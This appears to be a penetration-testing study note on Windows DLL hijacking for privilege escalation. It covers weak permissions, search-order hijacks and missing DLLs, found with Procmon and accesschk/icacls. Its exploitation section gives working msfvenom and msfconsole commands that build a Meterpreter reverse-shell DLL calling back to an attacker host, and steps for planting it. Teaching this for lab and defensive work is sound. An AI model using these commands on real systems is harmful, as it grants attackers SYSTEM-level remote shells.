### What is DLL?
**Dynamic Link Libraries (DLLs)** are libraries that contain data and procedures used by Windows applications and services, allowing the ***code to be used across multiple applications*** at any given time. This helps ***save disk space*** and allows applications to ***load faster*** due to code reuse.

To be used for privilege escalation, the ***executable must be run by an administrator-level account***. Luckily, most services are launched by the SYSTEM account. 

It's not just services that are vulnerable - any process launched by a privileged user could be vulnerable to DLL hijacking.

### DLL Hijacking
It tricks an executable into loading a malicious DLL instead of the intended one.

A process will likely be vulnerable to DLL hijacking if it meets at least one of the following criteria:
- It loads a DLL that you have ***write access*** (**weak DLL permissions**)
- You have ***write-access*** to a folder that's ahead of the folder that contains the intended DLL in the search order (**DLL search order hijack**)
- It attempts to load a DLL that doesn't exist (**missing DLLs**)

#### Weak DLL Permissions
Occurs when a user is given ***write or modify permissions*** over a DLL loaded by a process. These permissions allow you to completely replace the file. If a SYSTEM-launched service loads the malicious DLL, it results in privilege escalation.

#### DLL Search Order Hijack
Occurs when a ***writable folder appears before the intended DLL's location*** in the search order. When a ***process attempts to load a DLL without giving an exact path***, Windows will first attempt to look for the DLL in the folder where the executable exists.

Default DLL search order:
- **The directory from which the application was loaded**
- **C:\Windows\System32**
- **C:\Windows\System**
- **C:\Windows**
- **The current directory**
- **Directories in the system PATH variable**
- **Directories in the user PATH variable**

**Example**
If an application tries to load `customlibrary.dll` with just its name without specifying a full path, Windows follows ***DLL search order*** to locate the file. 

if an application tries to load `customlibrary.dll` from `C:\Windows\customlibrary.dll`, but you place your malicious DLL in `C:\Users\restricted1\CustomService\bin\customlibrary.dll`, Windows will load your DLL first because `C:\Users\restricted1\CustomService\bin` comes earlier in the search order.

#### Missing DLLs
It occurs when a ***process tries to load a DLL that doesn't exist*** on the system. Since Windows searches multiple locations for the DLL, an attacker can exploit this by placing a malicious DLL in a directory that appears earlier in the search order.

**Finding missing DLLs from Procmon**
Procmon (`Process Monitor`) is a Sysinternals tool that ***tracks real-time process activity***, including file system and registry actions. To identify missing DLLs:
- **Open Procmon** to view running processes and their operations.
- **Filter results** by setting `Result is NAME NOT FOUND` to locate failed DLL access attempts.
- **Refine further** by filtering `Path ends with .dll` to show only missing DLLs.
- **Identify privileged processes** (e.g., Administrator or SYSTEM) attempting to load missing DLLs.
- **Check write access** to determine if you can place a malicious DLL in a location Windows will find.

Name of the vulnerable process can be found under `Process -> Path`.
Filename of the missing DLL can be found under `Event -> Path`.

**Writable Folders**
To exploit a missing DLL vulnerability, you must identify a writable folder in the DLL search order where you can place your malicious DLL.

Step 1. Find a Writable Folder:
- In Procmon -> Process > Path

Step 2. Check folder permissions:
	**AccessChk**
		`accesschk.exe -dqv "C:\Program Files\Backup Files\Daily Backup"`
	**icacls**
		`icacls "C:\Program Files\Backup Files\Daily Backup"`

### Exploitation
**Generate Payload**
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$kaliIPAddress LPORT=4444 -f dll -o daily.dll
```

`Transfer the payload to the Windows Target`

**Launch a Listener**
```
msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost $kaliIPAddress; set lport 4444; exploit"
```

### Replacement
To exploit a DLL hijacking vulnerability, follow these steps based on the type of vulnerability you're targeting:
- **Weak Permissions:** Overwrite the target DLL with your payload.
- **DLL Search Order Hijack:** Place your malicious DLL in a folder higher in the DLL search order than the intended DLL.
- **Missing DLL Exploit:** Add your DLL to a folder in the DLL search order (e.g., same folder as the executable).